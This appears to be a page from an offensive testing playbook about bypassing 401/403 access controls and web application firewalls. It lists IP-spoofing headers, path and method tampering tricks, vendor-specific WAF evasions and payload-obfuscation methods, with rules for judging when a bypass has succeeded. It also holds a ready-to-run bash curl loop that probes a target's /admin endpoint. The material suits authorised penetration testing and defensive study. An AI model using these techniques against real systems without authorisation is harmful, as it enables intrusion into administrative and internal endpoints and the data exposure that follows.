# 403 / 401 Bypass Matrix

Run against every 401/403 endpoint (`assets/live-auth.txt` + any gated path found in Phases 2/4). A
bypass that lands in `/admin`, `/api/internal/*`, or `/debug` chains straight into IDOR/RCE/data exposure.

## Fingerprint the WAF first
`cf-ray` → Cloudflare · `x-amzn` → AWS WAF · `TS…` cookie → F5 BIG-IP · `incap_ses` → Imperva.
Use `wafw00f <url>` when installed. Vendor dictates which tricks land.

## Technique classes
| Class | Try |
|---|---|
| **IP-spoof headers** | `X-Forwarded-For: 127.0.0.1`, `True-Client-IP`, `CF-Connecting-IP`, `X-Originating-IP`, `X-Remote-Addr`, `X-Remote-IP`, `X-Client-IP`, `Forwarded: for=127.0.0.1`, `Via`, `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` |
| **Path tricks** | `/%2e/admin`, `/%252e/admin`, `/admin/.`, `/admin/`, `/admin//`, `//admin`, `/./admin`, `/admin;/`, `/admin..;/`, `/admin%20`, `/admin%09`, `/admin%00` |
| **Suffix tricks** | `/admin.json`, `/admin.html`, `/admin.css`, `/admin#`, `/admin?` |
| **Method tamper** | swap GET→`POST`/`PUT`/`PATCH`/`TRACE`/`HEAD`; `X-HTTP-Method-Override: GET` on a POST-only guard |
| **Content-Type confusion** | `application/json` vs `multipart/form-data`; dual Content-Type header |
| **Vendor-specific** | Cloudflare: TE + `X-Forwarded-Host`. AWS WAF: `/**/` comment split. Imperva: `%c0%2e` unicode dot. F5: double-slash path. |

## Verdict logic (don't trust raw status)
WAFs return **200** with a challenge/block page to hide blocking. Sample a "block baseline" (a known-bad
XSS payload) first, then:
- `bypassed` = status ∈ {200,201,204,301,302,401,500,502,503} AND body ≠ block baseline AND no vendor signature.
- `needs_review` = status OK but body ambiguous.
- `blocked` = body matches vendor signature OR length ≈ baseline (±5%).
**401 and 500 are wins** — the request reached the backend past the WAF edge. Extract any WAF Log/Incident
ID from the block page and include it in the report (triage can look up the exact rule that fired).

## curl probe loop
```bash
U=https://target.com/admin
for H in "X-Forwarded-For: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "True-Client-IP: 127.0.0.1"; do
  echo "== $H =="; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -H "$H" "$U"
done
for P in "/%2e/admin" "/admin/." "//admin" "/admin..;/" "/admin.json" "/admin%20"; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} $P\n" "https://target.com$P"
done
for M in POST PUT PATCH TRACE HEAD; do curl -s -o /dev/null -w "%{http_code} $M\n" -X $M "$U"; done
```

## Payload-level WAF bypass (when a keyword, not a path, is blocked)
URL-encode 1–3 layers, unicode escape, HTML entity, SQL inline comment (`/*!50000SELECT*/`), MySQL
version comment, case-mixing, operator substitution, base64 XSS wrapper, null-byte insertion. See
[payloads.md](payloads.md) for the raw strings.
